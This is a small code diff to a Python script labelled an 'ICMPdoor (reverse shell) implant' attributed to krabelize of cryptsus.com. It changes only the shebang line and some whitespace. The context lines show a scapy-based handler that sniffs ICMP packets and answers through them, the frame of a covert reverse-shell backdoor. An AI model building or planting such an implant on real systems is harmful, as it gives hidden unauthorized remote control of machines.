@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 #By krabelize | cryptsus.com
 #ICMPdoor (reverse shell) implant
 from scapy.all import *
@@ -21,5 +21,5 @@ def icmpshell(pkt):
         sr(icmppacket, timeout=0, verbose=0)
     else:
         pass
-    
+
 sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")
